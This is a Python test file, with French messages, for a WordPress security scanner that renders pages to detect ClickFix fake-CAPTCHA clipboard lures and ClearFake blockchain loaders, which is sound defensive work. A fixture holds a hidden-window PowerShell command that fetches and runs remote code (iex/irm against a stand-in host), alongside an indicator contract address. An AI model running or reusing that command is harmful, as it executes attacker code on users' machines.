"""Passe de rendu : politique des requêtes et analyse, sans navigateur."""
import pytest

from wp_security_forsure.scanner.checks.base import SSRFBlocked
from wp_security_forsure.scanner.render import (Blocked, RenderObservation,
                                                RequestPolicy, analyze, summary)

TARGET = "https://cible.test"
PS = "power" + "shell"
IOC = "0x46790e2Ac7F3CA5a7D1bfCe312d11E91d23383Ff"


def policy(**kw):
    kw.setdefault("destination_check", lambda url: None)
    return RequestPolicy(TARGET, **kw)


def test_only_read_methods_leave_and_post_bodies_are_kept():
    p = policy()
    assert p.decide("GET", "https://cible.test/") == (True, "")
    body = '{"jsonrpc":"2.0","method":"eth_call"}'
    allowed, reason = p.decide("POST", "https://tiers.example/api", "fetch", post_data=body)
    assert not allowed and "POST" in reason
    assert p.blocked[0].post_data == body


def test_blockchain_nodes_are_never_contacted_even_in_get():
    p = policy()
    assert not p.decide("GET", "https://bsc-dataseed.binance.org/")[0]
    assert not p.decide("GET", "https://api.ethplorer.io/getAddressInfo/x")[0]
    assert p.contacted_hosts == set()


def test_main_frame_cannot_navigate_to_another_site():
    p = policy()
    assert not p.decide("GET", "https://ailleurs.example/", "document", main_navigation=True)[0]
    assert p.blocked[-1].main_navigation
    assert p.decide("GET", "https://www.cible.test/page/", "document", main_navigation=True)[0]
    # Une iframe tierce se charge (c'est ainsi qu'arrive le leurre).
    assert p.decide("GET", "https://lure.example/captcha.html", "document")[0]


def test_private_addresses_are_refused():
    def guard(url):
        if "interne" in url:
            raise SSRFBlocked("adresse privée")
    p = RequestPolicy(TARGET, destination_check=guard)
    assert not p.decide("GET", "https://interne.example/x.js")[0]
    assert "adresse privée" in p.blocked[0].reason


def test_forbidden_paths_on_the_site_are_blocked():
    p = policy()
    assert not p.decide("GET", "https://cible.test/wp-cron.php?doing_wp_cron=1")[0]
    assert not p.decide("GET", "https://cible.test/wp-content/uploads/x.php")[0]


def test_third_party_switch_and_budget():
    p = policy(third_party=False)
    assert not p.decide("GET", "https://cdn.tiers.example/a.js")[0]
    assert p.decide("GET", "https://cible.test/a.js")[0]
    q = policy(max_requests=2)
    assert q.decide("GET", "https://cible.test/1")[0]
    assert q.decide("GET", "https://cible.test/2")[0]
    assert not q.decide("GET", "https://cible.test/3")[0]


def test_non_http_schemes():
    p = policy()
    assert p.decide("GET", "data:text/javascript,1")[0]
    assert not p.decide("GET", "ftp://cible.test/x")[0]


def obs(profile="victim_google", **kw):
    o = RenderObservation(page="https://cible.test/", profile=profile, ok=True)
    for k, v in kw.items():
        setattr(o, k, v)
    return o


def by_message(findings, start):
    return [f for f in findings if f["message"].startswith(start)]


def test_clipboard_command_is_critical_and_confirmed():
    cmd = f'{PS} -w h -c "iex(irm https://x.invalid/a)"'
    found = analyze([obs(events=[("clipboard", cmd, "https://lure.example/")],
                         clicked="input[type=checkbox] « I am not a robot »")], TARGET)
    f = by_message(found, "ClickFix : la page place")[0]
    assert f["severity"] == "CRITICAL" and f["confidence"] == "confirmed"
    assert "hxxps://" in f["evidence"] and "https://x.invalid" not in f["evidence"]
    assert "rien n'a été écrit" in f["evidence"]


def test_harmless_clipboard_write_is_ignored_without_lure():
    assert analyze([obs(events=[("clipboard", "CODE-PROMO", "https://cible.test/")])],
                   TARGET) == []


def test_eth_call_to_published_contract_is_critical():
    body = '{"jsonrpc":"2.0","method":"eth_call","params":[{"to":"%s"}]}' % IOC
    b = Blocked("POST", "https://bsc-testnet-rpc.publicnode.com/", "nœud RPC", "fetch", body)
    f = analyze([obs(blocked=[b])], TARGET)[0]
    assert f["severity"] == "CRITICAL" and "ClearFake" in f["message"]


def test_eth_call_without_known_contract_is_high_confirmed():
    body = '{"jsonrpc":"2.0","method":"eth_call","params":[{"to":"0x%s"}]}' % ("ab" * 20)
    b = Blocked("POST", "https://rpc.autre.example/", "méthode POST (lecture seule)", "fetch", body)
    f = analyze([obs(blocked=[b])], TARGET)[0]
    assert f["severity"] == "HIGH" and f["confidence"] == "confirmed"


def test_blocked_offsite_navigation_is_reported():
    b = Blocked("GET", "https://ailleurs.example/x", "navigation", "document", "", True)
    f = analyze([obs(blocked=[b])], TARGET)[0]
    assert f["message"].startswith("Redirection JavaScript vers un autre site (ailleurs.example)")


def test_fake_captcha_overlay():
    overlay = {"tag": "IFRAME", "cover": 1.0, "src": "https://lure.example/c.html",
               "text": ""}
    frames = [("https://lure.example/c.html", "I am not a robot. Press Windows + R", "")]
    f = by_message(analyze([obs(overlays=[overlay], frames=frames)], TARGET),
                   "Superposition plein écran")[0]
    assert f["severity"] == "HIGH" and "hxxps://lure.example" in f["evidence"]


def test_rendered_dom_and_eval_are_scanned():
    html = "<html><script>console.log('Road unavaible:')</script></html>"
    found = analyze([obs(frames=[("https://cible.test/", "", html)],
                         events=[("eval", "var c='%s';" % IOC.lower(), "https://cible.test/")])],
                    TARGET)
    assert any("(page rendue)" in f["message"] for f in found)
    assert any("(code exécuté par eval)" in f["message"] for f in found)


def test_hosts_contacted_only_without_login_cookie():
    victim = obs(contacted_hosts={"cible.test", "lure.example"})
    logged = obs("logged_in", contacted_hosts={"cible.test"})
    f = analyze([victim, logged], TARGET)[0]
    assert f["severity"] == "HIGH" and "lure.example" in f["evidence"]


def test_failed_render_is_not_analyzed_but_summarized():
    failed = RenderObservation(page="https://cible.test/", profile="victim_google",
                               ok=False, error="TimeoutError: x")
    assert analyze([failed], TARGET) == []
    s = summary([failed, obs(blocked=[Blocked("POST", "https://a.example/", "méthode POST (lecture seule)")])],
                TARGET)
    assert s["severity"] == "INFO" and "Échecs" in s["evidence"]
    assert "1 × méthode POST (lecture seule)" in s["evidence"]


@pytest.mark.parametrize("ua_attr", ["CHROME_DESKTOP_UA", "CHROME_ANDROID_UA"])
def test_render_user_agents_are_not_headless(ua_attr):
    from wp_security_forsure.scanner.checks import visit_profiles
    assert "Headless" not in getattr(visit_profiles, ua_attr)
